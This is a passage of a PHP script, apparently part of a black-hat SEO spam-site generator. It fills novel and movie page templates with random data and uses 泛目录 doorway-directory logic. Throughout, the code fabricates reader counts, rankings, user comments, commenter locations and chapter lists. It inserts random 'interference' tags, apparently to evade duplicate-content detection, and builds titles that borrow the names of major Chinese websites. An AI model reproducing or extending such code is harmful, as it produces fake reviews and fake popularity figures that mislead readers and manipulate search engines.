    					<div>作者：<span>'.$current_zuozhe.'</span></div>
    					<div>分类：<span>{#小说类}</span></div>{#随机N个标签}
    					<div>字数：<span>{#随机数6-7位}</span></div>
    					<div>已有: <span>{#随机数5-6位}人次</span> 读过此书</div>
    				</div>
    			</div>
    			<a href="#" class="cbut add_bs" bookid="'.$current_bookId.'"></a>
    			<div class="bookbutton">{#随机N个标签}
    				<a href="/h5/chapter.html?bookid='.$bookid.'&_st={#sz2}_{#sz3}_'.$bookid.'" style="border:1px solid #b33836;border-radius: 4px;color:#b33836;background:#f2f2f2;">立即阅读</a>
    			</div>
    			<div id="lastupdate" bookid="'.$current_bookId.'" chapterid="'.$current_chapterId.'" _link="/h5/chapter.html?bookid='.$bookid.'&_st={#sz2}_{#sz3}_'.$bookid.'">
    				<em class="vip">最新</em>{#随机N个标签}
    				<span class="last_tit">第'.rand(1,$zhangjie_num).'章 {#章节}</span>
    				<div class="time">'.rand(1,23).'小时前</div>
    			</div>
    		</div>
    
    		<h3 class="cat_tit2"><em></em>作品简介</h3>
    		<div class="book_intro">{#随机N个标签}
    			'.$jianjie_Arr[array_rand($jianjie_Arr,1)].$jianjie_Arr[array_rand($jianjie_Arr,1)].$jianjie_Arr[array_rand($jianjie_Arr,1)].'
    			<span id="more_intro"><em>【展开】</em><em style="display:none">【收起】</em></span>
    		</div>
    
    		<div class="book_tags">
    			<div class="tags_tit">标签：</div>
    			<div class="tags_wap">{#随机N个标签}
    				<a href="/h5/search?keywords={#zf18}">{#随机关键词}</a>
    				<a href="/h5/search?keywords={#zf18}">{#随机关键词}</a>
    				<a href="/h5/search?keywords={#zf18}">{#随机关键词}</a>{#随机N个标签}
    				<a href="/h5/search?keywords={#zf18}">{#随机关键词}</a>
    				<a href="/h5/search?keywords={#zf18}">{#随机关键词}</a>
    			</div>
    		</div>
    
    		<!--支持本书start-->
    		<h3 class="sub_tit"><em></em>支持本书</h3>
            <div class="donate">{#随机N个标签}
                <!-- 双倍活动不在活动期间 -->
         		<div class="donate_button" id="donate_wap">
    		    	<span dovalue="500"><div class="donate_tw"><div class="donate_ti">月</div></div><h5>投1张月票</h5>500纵横币<em>1</em></span>
    		    	<span dovalue="5000"><div class="donate_tw"><div class="donate_ti">月</div></div><h5>投11张月票</h5>5000纵横币<em>11</em></span>{#随机N个标签}
    		    	<span dovalue="100"><div class="donate_tw"><div class="donate_ti">抽</div></div><h5>抽月票</h5>100纵横币</span>
    		    </div>
                 	
        	    <div class="suply_wap">
        	    	<div>本书排在月票榜第<em style="color:#de1728;font-style:normal">{#随机数1位}</em>位，赶快支持下！</div>
        	        <a id="dovote">投张月票</a>{#随机N个标签}
        	    </div>
                <div class="suply_wap">
                    <div>投张推荐票来表达你对本书的态度吧!</div>
                    <a href="/h5/consume/prepare?tabindex='.rand(10000,99999).'&_st={#sz2}_{#sz3}_'.rand(10000,99999).'">投推荐票</a>
                </div>
        	    <div class="suply_wap">{#随机N个标签}
        	    	<div>更多种方式为作者捧场!</div>
        	        <a href="/h5/consume/prepare?tabindex='.rand(10000,99999).'&_st={#sz2}_{#sz3}_'.rand(10000,99999).'">更多捧场</a>
        	    </div>
                
            </div>
    		<!--支持本书 end-->
    
    		<!--作品目录start-->
    		<h3 class="sub_tit"><em></em>作品目录<span class="org">(共'.$zhangjie_num.'章)</span>{#随机N个标签}
    			<div id="read_fx" class="read_atz"></div>
    		</h3>
    		<div class="book_list" id="coverl_atz">{#随机N个标签}
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=69918625&amp_st={#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'">第1章 {#章节}</a>
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=69961665&amp_st={#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'">第2章 {#章节}</a>
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=69961696&amp_st={#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'">第3章 {#章节}</a>{#随机N个标签}
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=69966657&amp_st={#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'">第4章 {#章节}</a>
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=69966678&amp_st={#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'">第5章 {#章节}</a>
    		</div>{#随机N个标签}
    		<div class="book_list" id="coverl_zta" style="display:none">
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=70768136&amp{#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'"><em>VIP</em>第'.($zhangjie_num).'章 {#章节}</a>
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=70768106&amp{#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'"><em>VIP</em>第'.($zhangjie_num-1).'章 {#章节}</a>
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=70761601&amp{#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'"><em>VIP</em>第'.($zhangjie_num-2).'章 {#章节}</a>{#随机N个标签}
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=70761537&amp{#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'"><em>VIP</em>第'.($zhangjie_num-3).'章 {#章节}</a>
    			<a href="/h5/chapter.html?bookid='.$current_bookId.'&amp;cid=70757229&amp{#sz2}_{#sz3}_'.$current_bookId.'" title="字数:'.rand(2000,5000).'"><em>VIP</em>第'.($zhangjie_num-4).'章 {#章节}</a>
    		</div>{#随机N个标签}
    		<div class="sbut"><a href="/h5/chapterlist.html?bookid='.$current_bookId.'&amp;{#sz2}_{#sz3}_'.$current_bookId.'" class="view_more">进入作品目录 查看更多</a></div>
    		<!--作品目录end-->';
    	    $tpl = str_replace('{#本书详情}', $current_bookStr, $tpl);
    	        
            //喜欢换一换
            $like_book_data = '';
            for($j=1; $j<=9; $j++){
                $bookid = rand(100000,9999999);
                $readNum = $readNum - rand(40000,70000);
                $xiaoshuoming = $xsm_data_Arr[array_rand($xsm_data_Arr,1)];
                $like_book_data .= '<a href="/h5/book.html?bookid='.$bookid.'&_st={#sz2}_{#sz3}_'.$bookid.'">
        			<div class="bookbox" bookid="'.$bookid.'">{#随机N个标签}
        				<div class="bookimg"><img src="{#本地小说图片}" alt="'.$xiaoshuoming.'"></div>
        				<div class="bookinfo">
        					<h4 class="bookname">'.$xiaoshuoming.'</h4>
        					<div class="author">作者：<span>{#作者}</span></div>{#随机N个标签}
        					<div class="cat">分类：<span>{#小说类}</span></div>
        					<div class="mbfav_info"><div class="topcor"></div>{#随机数2位}% 的读者还看过这本书</div>
        				</div>
        			</div>{#随机N个标签}
    			</a>';
            }
            $tpl = str_replace('{#喜欢换一换}', $like_book_data, $tpl);
            
            
            //评论数据
            $pinglun_book_data = '';
            $forNum = rand(3,6);
            for($j=1; $j<=$forNum; $j++){
                $pinglun_book_data .= '<div class="thread_box" threadid="'.$bookid.'">
    				<div class="user_img">{#随机N个标签}
    				    <img src="{#本地美女图片}">
    				</div>
    				<div class="thread_r">
    					<h4 class="user_name">{#作者}</h4>
    					<div class="thread_txt">{#句子}</div>{#随机N个标签}
    					<span class="thread_time"><i style="padding-right:2px">{#随机日期时间}</i> · <i style="padding-left:2px">来自:{#城市}</i></span>
    					<span class="thread_lnk">回复(<span class="red">{#随机数2位}</span>)</span>
    				</div>{#随机N个标签}
    			</div>';
            }
            $tpl = str_replace('{#评论数据}', $pinglun_book_data, $tpl);
	    }
	}
    // 新电影模板 2022-11-11
    else if($WebSiteInfo['tpl'] == "temp_dy_221111" || $WebSiteInfo['tpl'] == "temp_dy_221230"){
        
        $dyTypeStr = '犯罪片,伦理片,喜剧片,独播片,恐怖片,奇幻片,科幻片,巨制片,战争片,字幕片,动画片,枪战片,惊悚片,爱情片,三级片,院线片,魔幻片,青春片,悬疑片,动作片,家庭片';
        $dyTypeStrArray = explode(',',$dyTypeStr);
        
        
        if($isPageIndex){ 
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
            
            //tr数据列表1
            $trStrData1 = '';
            for($i=1;$i<=6;$i++){
                $trStrData1 .= '<tr>{#随机N个标签}';
                for($j=1;$j<=4;$j++){
        			$trStrData1 .= '<td><ul><li><a href="/{#zf6}/{#zf15}.html" class="{#zf6}">{#导演},{#导演},{#导演}(主演)</a></li></ul></td>';
                }
    		    $trStrData1 .= '</tr>';
            }
            $tpl = str_replace('{#TR列表数据1}', $trStrData1, $tpl);
            
            //tr数据列表2
            $randKeyWordNum = 1;
            $trStrData2 = '';
            for($i=1;$i<=8;$i++){
                $trStrData2 .= '<tr>{#随机N个标签}';
                for($j=1;$j<=4;$j++){
                    
                    $seldyType_key = array_rand($dyTypeStrArray,1);
                    $seldyTypeStr = $dyTypeStrArray[$seldyType_key];
                    
        			$trStrData2 .= '<td><ul><li><a href="/{#zf6}/'.date('Y-m-d').'/{#关键词'.$randKeyWordNum.'URL}" class="{#zf6}">{#关键词'.$randKeyWordNum.'data}('.$seldyTypeStr.')</a></li></ul></td>';
        			$randKeyWordNum = $randKeyWordNum + 1;
                }
    		    $trStrData2 .= '</tr>';
            }
            $tpl = str_replace('{#TR列表数据2}', $trStrData2, $tpl);
            
            //tr数据列表3
            $trStrData3 = '';
            for($i=1;$i<=8;$i++){
                $trStrData3 .= '<tr>{#随机N个标签}'; 
                for($j=1;$j<=4;$j++){
        			$trStrData3 .= '<td><ul><li><a href="/{#zf6}/'.date('Y-m-d').'/{#关键词'.$randKeyWordNum.'URL}" class="{#zf6}">{#关键词'.$randKeyWordNum.'data}(第'.rand(1,100).'集)</a></li></ul></td>';
        			$randKeyWordNum = $randKeyWordNum + 1;
                }
    		    $trStrData3 .= '</tr>';
            }
            $tpl = str_replace('{#TR列表数据3}', $trStrData3, $tpl);
        }
        else{
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/temp.html'); 
            
            $seldyType_key = array_rand($dyTypeStrArray,1);
            $seldyTypeStr = $dyTypeStrArray[$seldyType_key];
            $tpl = str_replace('{#影片类型}', $seldyTypeStr, $tpl); 
            
            //演员列表数据
            $yanyuanStrData = '';
            for($i=1;$i<=3;$i++){
                $yanyuanStrData .= '<div class="item">
					<img class="lazy" src="{#本地图片}" style="width:110px;height:146px;border-radius: 11%;">{#随机N个标签}
					<div class="title" style="text-align:center;font-size:0.4rem;white-space:nowrap;overflow:hidden;width:108px;">{#演员}</div>
				</div>';
            }
            $tpl = str_replace('{#演员列表数据}', $yanyuanStrData, $tpl);
            
            //影集列表数据
            $yingjuStrData = '';
            $randMaxCount = rand(15,35);
            for($i=1;$i<=$randMaxCount;$i++){
                $yingjuStrData .= '<div class="item">
    				<a href="/play/{#szzf15}.html" class="" style="text-align:center;">第'.$i.'集<span></span></a>{#随机N个标签}
    			</div>';
            }
            $tpl = str_replace('{#影集列表数据}', $yingjuStrData, $tpl);
            
            //评论列表数据
            $pinglunStrData = '';
            for($i=1;$i<=3;$i++){
                $pinglunStrData .= '<div>
					<h3 style="color:#9g750j;font-weight:bold;">
						<img style="display: inline-block;vertical-align: middle;margin-left: 1px;height: 35px;width: 35px;font-size: 0;border-radius: 50%;margin-right: 10px;margin-bottom: 5px;" width="24" height="16" src="{#本地图片}">{#演员}
						<img style="display: inline-block; vertical-align: middle;margin-left: 6px;height: 16px;font-size: 0;" width="24" height="16" src="/Model/STYLE/V1/VIP/VIP-6.png">{#随机N个标签}
					</h3>
					<span style="color: #999999;display: inline-block;">发表于'.rand(1,59).'分钟前</span>
					<p style="color: #4b4b4b;">
						<span style="color:#adadad;font-weight:bold;font-size:14px;">回复 </span>
						<em style=" color: #4b4b4b; font-size: 13px; font-weight: 600;">{#句子}{#句子}{#句子}
					</p>{#随机N个标签}
				</div>
				<br>
				';
            } 
            $tpl = str_replace('{#评论列表数据}', $pinglunStrData, $tpl);
            
            $randKeyWordNum = 1;
            //更多列表数据
            $moreMvStrData = ''; 
            for($i=1;$i<=6;$i++){ 
                $moreMvStrData .= '<a href="/play/{#szzf6}/{#关键词'.$randKeyWordNum.'URL}"><div class="item">{#随机N个标签}
					<img class="lazy" src="{#本地图片}" style="width:110px;height:146px;border-radius: 10%;">
					<div class="title">{#随机N个标签}
						<a href="/play/{#szzf6}/{#关键词'.$randKeyWordNum.'URL}" style="white-space:nowrap;overflow:hidden;width:108px;text-align:center;">{#关键词'.$randKeyWordNum.'data}</a>
					</div>
				</div></a>
				';
				$randKeyWordNum = $randKeyWordNum + 1;
            }
            $tpl = str_replace('{#更多列表数据}', $moreMvStrData, $tpl);
            
            
            $mytt1 = ['腾讯网','搜狐网','搜狗','知乎','网易','哔哩哔哩','百度百科','微博','凤凰网','抖音','头条'];
            $mytt2 = ['{#yyyy}','全方面'];
            $mytt3 = [' ','.','/','-','|'];
            $titleStr = "(".$mytt2[array_rand($mytt2,1)]."已更新(今日".$mytt3[array_rand($mytt3,1)].$mytt1[array_rand($mytt1,1)].")";
            
            $tpl = str_replace('{#title}', $titleStr, $tpl);
        }
    }
    // 新电影模板 2022-11-01
    else if($WebSiteInfo['tpl'] == "temp_dy_221103"){
        
        //电影类型
        $dyTypeStr = 'yule,tiyu,bendi,jun1shi,NBA,guoji,keji,caijing,qiche,youxi,shuma,zuqiu,fangchan,CBA,jiankang,jiaoyu,lüyou,shipin,xingzuo,lishi,wenhua,kexue,yuer,shishang,qinggan,zongyi,gupiao,licai,xinguofeng,lishiju,yanqingju,xuanyiju,kehuanju,shenhuaju,jingfeiju,xiandaiju,guzhuangju,lunliju,biantaiju,kongbuju,chuanshuoju,huiyiju,xuanyiju,donghuaju,aiqingpian,dongzuopian,kehuanpian,xuanyipian,xijupian,zhanzhengpian,kongbupian';
        $dyTypeStrArray = explode(',',$dyTypeStr);
        
        $dyTypeCnStr = '娱乐,体育,本地,军事,NBA,国际,科技,财经,汽车,游戏,数码,足球,房产,CBA,健康,教育,旅游,视频,星座,历史,文化,科学,育儿,时尚,情感,综艺,股票,理财,新国风,历史剧,言情剧 ,悬疑剧 ,科幻剧 ,神话剧 ,警匪剧 ,现代剧 ,古装剧 ,伦理剧 ,变态剧 ,恐怖剧 ,传说剧 ,回忆剧 ,悬疑剧 ,动画剧,爱情片,动作片,科幻片,悬疑片,喜剧片,战争片,恐怖片';
        $dyTypeCnStrArray = explode(',',$dyTypeCnStr);
        
        if($isPageIndex){ 
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
            
            //电影列表数据
            $dyRepListStr = '';
            $dyRepListStr_1 = '';
            for($j=1; $j<=16; $j++){
    			    
    		    $seldyType_key = array_rand($dyTypeStrArray,1);
                $seldyTypeStr = $dyTypeStrArray[$seldyType_key];
                $seldyTypeCnStr = $dyTypeCnStrArray[$seldyType_key];
    			
    			if($j <= 15){
                    $dyRepListStr .= '<div class="{#zf5} item clearfix">
            			<div style="display: block;padding: 12px 0 12px 87px;border-bottom: 1px solid #e5e5e5;">{#随机N个标签}
            				<div class="{#zf5} cover">
            					<img width="75" height="100" class="{#zf5} " src="{#本地电影图片}" style="background: rgb(238, 238, 238); display: block;">
            				</div>
            				<div class="{#zf5} body">
            				<a href="/'.$seldyTypeStr.'/'.date('Y-m-d').'/{#关键词'.$j.'URL}" style="display:block;padding:1px 0 2px 1px;border-bottom: 1px solid #e5e5e5;font-size: 1.6rem;">{#关键词'.$j.'data}</a>
            				<div class="{#zf5} col">导演：{#导演}</div>{#随机N个标签}
            				<div class="{#zf5} col">类型：'.$seldyTypeCnStr.'</div>
            				<div class="{#zf5} col">时间：{#随机日期时间}</div>
            				</div>
            			</div>{#随机N个标签}
            		</div>
            		
            		';
    			}
    			else{
    			    $dyRepListStr_1 = '<div class="{#zf5} item clearfix">
            			<div style="display: block;padding: 12px 0 12px 87px;border-bottom: 1px solid #e5e5e5;">
            				<div class="{#zf5} cover">{#随机N个标签}
            					<img width="75" height="100" class="{#zf5} " src="{#本地电影图片}" style="background: rgb(238, 238, 238); display: block;">
            				</div>
            				<div class="{#zf5} body">{#随机N个标签}
            				<a href="/'.$seldyTypeStr.'/'.date('Y-m-d').'/{#关键词'.$j.'URL}" style="display:block;padding:1px 0 2px 1px;border-bottom: 1px solid #e5e5e5;font-size: 1.6rem;">{#关键词'.$j.'data}</a>
            				<div class="{#zf5} col">导演：{#导演}</div>
            				<div class="{#zf5} col">类型：'.$seldyTypeCnStr.'</div>
            				<div class="{#zf5} col">时间：{#随机日期时间}</div>
            				</div>{#随机N个标签}
            			</div>
            		</div>
            		
            		';
    			} 
    		}
    		$tpl = str_replace('{#电影列表数据}', $dyRepListStr, $tpl); 
    		$tpl = str_replace('{#1个电影列表数据}', $dyRepListStr_1, $tpl);
    		$tpl = str_replace('{#特别的class样式}', 'class'.randStr(5), $tpl);
        }
        else{
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/0/temp.html');
            
            //电影集数数据
            $jishuDataStr = '';
            $forIndex = rand(10,35); 
            for($j=1; $j<=$forIndex; $j++){ 
                
                $seldyType_key = array_rand($dyTypeStrArray,1);
                $seldyTypeStr = $dyTypeStrArray[$seldyType_key];
                $seldyTypeCnStr = $dyTypeCnStrArray[$seldyType_key];
                
                $jishuDataStr .= '<div class="{#zf5} item">
    				<a href="/'.$seldyTypeStr.'/'.date('Y-m-d').'/{#关键词'.($j+30).'URL}" class="{#zf5}" style="text-align:center;">
    					第'.($j+50).'集
    					<span></span>
    				</a>
    			</div> 
    			';
            }
            $tpl = str_replace('{#电影集数数据}', $jishuDataStr, $tpl);
            
            
            //更多电影数据
            $moreMovieDataStr = '';
            for($j=1; $j<=6; $j++){
                
                $seldyType_key = array_rand($dyTypeStrArray,1);
                $seldyTypeStr = $dyTypeStrArray[$seldyType_key];
                $seldyTypeCnStr = $dyTypeCnStrArray[$seldyType_key];
                
                $moreMovieDataStr .= '<div class="{#zf5} item">
    		    <img class="{#zf5} lazy" src="{#本地电影图片}" style="width:110px;height:146px;border-radius: 10%;" />
    			<div class="{#zf5} title">
    	        <a href="/'.$seldyTypeStr.'/'.date('Y-m-d').'/{#关键词'.($j+80).'URL}" style="white-space:nowrap;overflow:hidden;width:108px;text-align:center;">{#关键词'.($j+90).'data}</a>
    			</div>
    		</div> 
    			';
            }
            $tpl = str_replace('{#更多电影数据}', $moreMovieDataStr, $tpl);
            
            
            //演员列表数据
            $yanyuanDataStr = '';
            for($j=1; $j<=3; $j++){
                $yanyuanDataStr .= '<div class="{#zf5} item">
    				<img class="{#zf5} lazy" src="{#本地电影图片}" style="width:110px;height:146px;border-radius: 11%;" />
    				<div class="{#zf5} title" style="text-align:center;font-size:0.4rem;white-space:nowrap;overflow:hidden;width:108px;">{#演员}</div>
    		        </div>
    		        ';
            }
            $tpl = str_replace('{#演员列表数据}', $yanyuanDataStr, $tpl);
            
            
            //评论数据
            $pinglunDataStr = '';
            for($j=1; $j<=3; $j++){
                
                $pinglunDataStr .= '<div>
    			<h3 style="color:#4b4b4b;font-weight:bold;">
    			    <img style="display: inline-block;vertical-align: middle;margin-left: 1px;height: 35px;width: 35px;font-size: 0;border-radius: 50%;margin-right: 10px;margin-bottom: 5px;" width="24" height="16" src="{#本地电影图片}">{#演员}
                    <img style="display: inline-block; vertical-align: middle;margin-left: 6px;height: 16px;font-size: 0;" width="24" height="16" src="{#本地电影图片}">
    			</h3>
    			<span style="color: #999999;display: inline-block;">发表于'.rand(1,59).'分钟前</span> 
    		    <p style="color: #4b4b4b;">
                <span style="color:#adadad;font-weight:bold;font-size:14px;">回复 </span>
                <em style=" color: #4b4b4b; font-size: 13px; font-weight: 600;">{#演员} </em>: 
                {#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}</p>
    			</div>
    			<br> 
    			';
            }
            $tpl = str_replace('{#电影评论数据}', $pinglunDataStr, $tpl);
            
            $tpl = str_replace('{#剧情简介数据}', '{#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}{#句子}{#特殊字符}', $tpl);
            $tpl = randReplaceRoute('特殊字符', rand(4,8), ',,,');
        }
        $tpl = randReplaceRoute('随机路径目录', 1, $dyTypeStr);
    } 
    // 新小说模板
    else if($WebSiteInfo['tpl'] == "temp_xs_11"){
        
        $fanmulu_txt = $WebSiteInfo['fanmulu'][0];
        $fanmulu_read = $WebSiteInfo['fanmulu'][1];
    
        $xiaoshuo_array = getDataArr("data", "xiaoshuo");
        $zuozhe_array = getDataArr("data", "zuozhe");
        $zhangjie_array = getDataArr("data", "zhangjie");
        
        $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
	    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
	    $zhangjie_Str = trim($zhangjie_array[array_rand($zhangjie_array, 1)], PHP_EOL);
	    
	    $myBookPage = array('/', '/history.html', '/paihang.html', '/read.html', '/top.html', '/quanben.html', '/login.html', 
	        '/register.html', "/xhmf.html" ,"/xxxz.html" ,"/dsyq.html" ,"/lsjs.html" ,"/wyjj.html" ,"/khwl.html",
	        "/shuku.html", "/lygg.html" ,"/yqns.html" ,"/other.html" ,"/monthvisit.html" ,"/goodnum.html" ,"/weekvisit.html" ,
	        "/dayvisit.html" ,"/size.html" ,"/goodnew.html" ,"/postdate.html" ,"/lastupdate.html"
	    ); 
	     
	    $xsTypeArr = array(
	        "/ebook/xhmf.html" => "玄幻魔法" ,"/ebook/xxxz.html" => "仙侠修真" ,"/ebook/dsyq.html" => "都市言情" ,"/ebook/lsjs.html" => "历史军事"
    		,"/ebook/wyjj.html" => "网游竞技" ,"/ebook/khwl.html" => "科幻未来" ,"/ebook/lygg.html" => "灵异鬼怪" ,"/ebook/yqns.html" => "言情女生"
    		,"/ebook/other.html"=> "其他类型"
		);
		
		$xsTopArr = array(
	        "/ebook/top.html" => "总排行榜" ,"/ebook/monthvisit.html" => "月排行榜" ,"/ebook/goodnum.html" => "收藏榜" ,"/ebook/weekvisit.html" => "周排行榜"
	        ,"/ebook/dayvisit.html" => "日排行榜" ,"/ebook/size.html" => "字数榜" ,"/ebook/goodnew.html" => "新书榜" ,"/ebook/postdate.html" => "新书上架"
	        ,"/ebook/lastupdate.html" => "更新榜"
		);
	    
	    $myCurrentUrl = '';
	    if(in_array($url_real, $myBookPage) && $isPageIndex){
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].$url_real);
	        
	        if($url_real == "/" || $url_real == ""){
	            if($url_params == ''){
	                $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
	            }
	            else{
	                $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/'.rand(0,1).'/'.'read.html');
	            }
	        }
	        
	        foreach($xsTypeArr as $key => $value) {
	            if($key == '/ebook'.$url_real){
	                $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/quanben.html');
	                break;
	            }
	        }
	        foreach($xsTopArr as $key => $value) {
	            if($key == '/ebook'.$url_real){
	                $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/top.html');
	                break;
	            }
	        }
	        $myCurrentUrl = '/ebook'.$url_real;
	    }
	    else{
	        // 小说泛目录
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/'.rand(0,1).'/'.'read.html');
	    }
	   
		
		$index_sx_type = '{#新的干扰标签}';
	    $xsType_li = '{#新的干扰标签}';
		$top_xs_type = '';
		$currentXsType = '';
		$xsTypeNameArr = [];
		$xsTypeCount = 0;
        foreach($xsTypeArr as $key => $value) {
            array_push($xsTypeNameArr, $value);
            
            //小说类型导航
            if($myCurrentUrl == $key){
                $currentXsType = $value;
                $xsType_li .= '<li><a href="'.$key.'" class="onselect">'.$value.'</a></li>';
            }
            else{
                $xsType_li .= '<li><a href="'.$key.'">'.$value.'</a></li>';
            }
            
            
            //首页小说类型列表
            $index_sx_type .= '<div class="col-md-4 '.($xsTypeCount%3==0?'':'pl0').'">';
            $index_sx_type .= '<div class="panel panel-default"><div class="panel-heading">{#随机N个标签}';
            $index_sx_type .= '<span class="glyphicon glyphicon-th-large" aria-hidden="true"></span>'.$value;
            $index_sx_type .= '<a class="pull-right" href="'.$key.'">More+</a>';
			$index_sx_type .= '</div><ul class="list-group list-top">';
			for($j=1; $j<=10; $j++){
			    
			    $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
			    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
			    
				$index_sx_type .= '<a href="{#当前域名}/'.$fanmulu_txt.'" title="'.$xiaoshuo_Str.'" class="list-group-item" target="_blank">';
				$index_sx_type .= $xiaoshuo_Str.'<span class="pull-right fs-12">'.$zuozhe_Str.'</span></a>{#随机N个标签}';
			}
			$index_sx_type .= '</ul></div></div>';
			
			//小说类型排行
		    $top_xs_type .= '<div class="col-md-4"><div class="panel panel-default"><div class="panel-heading">{#随机N个标签}';
			$top_xs_type .= '<span class="glyphicon glyphicon-th-large" aria-hidden="true"></span> '.$value;
			$top_xs_type .= '<a class="pull-right" href="'.$key.'">More+</a>';
			$top_xs_type .= '</div><ul class="list-group list-top">';
			for($j=0; $j<=10; $j++){
			    
			    $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
			    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
			    
			    $top_xs_type .= '<a href="{#当前域名}/'.$fanmulu_txt.'" title="'.$xiaoshuo_Str.'" class="list-group-item" target="_blank">{#随机N个标签}';
			    $top_xs_type .= $xiaoshuo_Str.'<span class="pull-right fs-12">'.$zuozhe_Str.'</span></a>';
			}
			$top_xs_type .='</ul></div></div>';
			$xsTypeCount ++;
        }
        $tpl=str_replace('{#小说类型排行2}', '<div class="row">'.$top_xs_type.'</div>', $tpl);
        $tpl=str_replace('{#小说类型导航}', $xsType_li, $tpl);
        $tpl=str_replace('{#首页小说类型列表}', $index_sx_type, $tpl);
        
        //首页小说最新入库
        $index_new_ruku_Str = '{#新的干扰标签}';
        for($j=1; $j<=10; $j++){
            
            $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
		    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
            $currentXs_lx = trim($xsTypeNameArr[array_rand($xsTypeNameArr, 1)], PHP_EOL);
            
            $index_new_ruku_Str .= '<tr><td class="text-muted hidden-xs" width="70">'.$currentXs_lx.'</td>{#随机N个标签}';
		    $index_new_ruku_Str .= '<td><a href="{#当前域名}/'.$fanmulu_txt.'" title="'.$xiaoshuo_Str.'" target="_blank">'.$xiaoshuo_Str.'</a>{#随机N个标签}</td>';
		    $index_new_ruku_Str .= '<td class="text-right fs-12" >'.$zuozhe_Str.'</td></tr>';
        }
        $tpl=str_replace('{#首页小说最新入库}', $index_new_ruku_Str, $tpl);
        
        //首页小说最新资讯
        $index_new_zixun_Str = '{#新的干扰标签}';
        for($j=1; $j<=8; $j++){
            $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
            $index_new_zixun_Str .= '<tr><td><a href="{#当前域名}/'.$fanmulu_txt.'" title="'.$xiaoshuo_Str.'" target="_blank">{#随机N个标签}';
            $index_new_zixun_Str .= $xiaoshuo_Str.'</a></td></tr>';
        }
        $tpl=str_replace('{#首页小说最新资讯}', $index_new_zixun_Str, $tpl);
        
        
        //首页小说最新更新
        $index_new_update_Str = '{#新的干扰标签}';
        for($j=1; $j<=20; $j++){
            
            $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
		    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
		    $zhangjie_Str = trim($zhangjie_array[array_rand($zhangjie_array, 1)], PHP_EOL);
		    $currentXs_lx = $currentXsType == "" ? trim($xsTypeNameArr[array_rand($xsTypeNameArr, 1)], PHP_EOL) : $currentXsType;
		    
            $index_new_update_Str .= '<tr><td class="text-muted hidden-xs" width="70">'.$currentXs_lx.'</td>{#随机N个标签}';
			$index_new_update_Str .= '<td><a href="{#当前域名}/'.$fanmulu_txt.'" title="'.$zhangjie_Str.'" target="_blank">'.$xiaoshuo_Str.'</a></td>';
			$index_new_update_Str .= '<td class="hidden-xs"><a href="{#当前域名}/'.$fanmulu_txt.'" title="第'.rand(1,9).'章 '.$zhangjie_Str.'" target="_blank">';
			$index_new_update_Str .= '第'.rand(100,999).'章 '.$zhangjie_Str.'</a>{#随机N个标签}</td>';
			$index_new_update_Str .= '<td class="text-right fs-12" title="'.$zuozhe_Str.'">'.$zuozhe_Str.'</td>';
			$index_new_update_Str .= '<td class="fs-12 hidden-xs" width="72">'.rand(1,9).'小时前</td></tr>';
        }
        $tpl=str_replace('{#首页小说最新更新}', $index_new_update_Str, $tpl);
        
        
        //热门类型小说
		$booksImg_index = '{#新的干扰标签}';
		for($j=1; $j<=6; $j++){
		    
            $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
